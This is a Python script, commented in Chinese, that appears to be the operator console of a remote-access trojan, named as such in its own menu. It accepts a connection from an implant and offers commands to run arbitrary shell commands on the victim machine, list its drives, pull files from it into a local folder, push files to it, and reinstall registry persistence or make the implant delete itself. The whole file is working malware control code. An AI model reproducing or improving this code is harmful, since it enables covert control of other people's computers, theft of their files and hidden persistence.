import socket
import os
from os.path import exists
import inspect
print('我是王!开始运行')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('127.0.0.1', 8000))
s.listen(10)
a, b = s.accept()
print(b, end='')
print("接入服务器")
#os.system('1.wav')
def fa(x):
    with open(x, 'rb') as f:
        ff = f.read()
        try:
            a.send(ff)
        except:
            a.send('文件发送出现问题'.encode('utf-8'))
    a.send('2发送任务完成'.encode('utf-8'))
def jieshou():
    name = a.recv(1024).decode('utf-8')
    print("%s" % name, '开始接收')
    while 1:
        cc = a.recv(1048576)
        if cc[-19:-18] == b'2':
            print("%s" % name, '接收完成')
            with open(r'D:\新建文件夹\编程资源库\小木马呀乖又乖\%s' % name, 'ab') as f:
                f.write(cc[:-19])
            break
        else:
            print('jishu')
            with open(r'D:\新建文件夹\编程资源库\小木马呀乖又乖\%s' %name , 'ab') as f:
                f.write(cc)
def m_or_w(x):
    x = x[-4:]
    if '.'in x:
        return 1
    else:
        return 0
ml = ['c:/', 'd:/', 'e:/']
while 1:
    for i in range(len(ml)):
        print(i+1, end='  ')
        print(ml[i])
    lei = input('\n     结束木马运行：-1（-1）'
                '\n     对系统执行cmd命令：0'
                '\n     进入内存并展示文件路径(zj)：1'
                '\n     获取对方文件：2'
                '\n     给与对方文件：3'
                '\n     重新写入注册表：4'
                '\n')
    if lei == '0':
        a.send('0'.encode('utf-8'))
        minlin = input('输入严格os格式命令：')
        a.send(minlin.encode('utf-8'))
        print(a.recv(100).decode('utf-8'))


    elif lei == '1':
        a.send('1'.encode('utf-8'))
        lujinn = int(input('请输入想看的路径(0为指定目录)'))
        if lujinn == 0:
            lujinn = input('请输入指定绝对路径')
        else:
            lujinn = ml[lujinn - 1]
        if m_or_w(lujinn):
            a.send(lujinn.encode('utf-8'))
            print(a.recv(1204).decode('utf-8'))
            print(a.recv(100).decode('utf-8'))
        else:
            a.send(lujinn.encode('utf-8'))
            jie = a.recv(1204).decode('utf-8')  # 接收文件路径

            if jie == '1路径可能有问题':

                print(a.recv(100).decode('utf-8'))
                continue
            elif jie == '1木马任务完成':
                print('将要进入的问价夹为空')
                continue
            del ml
            ml = []
            i = 0
            jiec = -1
            while 1:
                if jie[i] == "!":
                    ml.append(lujinn+'/'+jie[jiec+1:i])
                    try:
                        jie[i+1]
                    except:
                        break
                    jiec = i
                i = i+1
            print(a.recv(100).decode('utf-8'))

    elif lei == '2':
        a.send('2'.encode('utf-8'))
        lujinn = int(input('请输入下载的文件路劲(0为退出)'))
        lujinn = ml[lujinn - 1]
        if lujinn == '0':
            continue
        else:
            if m_or_w(lujinn):
                a.send(lujinn.encode('utf-8'))
                jieshou()
            else:
                print('暂不支持文件夹')
                pass
    elif lei == '3':
        lujin = input('输入文件名（请放在同问价夹下）')
        caller_file = inspect.stack()[0][1]
        if exists(os.path.abspath(os.path.dirname(caller_file)) + '/%s' % lujin) == 0:
            print('我是王：发送失败，没有此文件夹')
            continue
        a.send('3'.encode('utf-8'))
        a.send(lujin.encode('utf-8'))
        fa(lujin)

        print(a.recv(100).decode('utf-8'))


    elif lei == '4':
        a.send('4'.encode('utf-8'))
        xuhao = input('4为重新添加，0为木马自毁')
        if xuhao == '0':
            a.send('0'.encode('utf-8'))
            print(a.recv(1024).decode('utf-8'))
        elif xuhao == '4':
            a.send(xuhao.encode('utf-8'))
            print(a.recv(1024).decode('utf-8'))
        else:
            print('输入错误，已作为4处理')
            a.send(xuhao.encode('utf-8'))
            print(a.recv(1024).decode('utf-8'))

    elif lei == '-1':
        a.send('-1'.encode('utf-8'))
        print(a.recv(100).decode('utf-8'))
        a.send(input('请确定请求频率：（s）').encode('utf-8'))
        print(a.recv(100).decode('utf-8'))#等待连接状态

        print('服务器:已退出')
        break


    elif lei == '-1-1':
        a.send('-1-1'.encode('utf-8'))
        print(a.recv(100).decode('utf-8'))
        print('我是王:已退出')
        break

    else:
        print('输入错误')

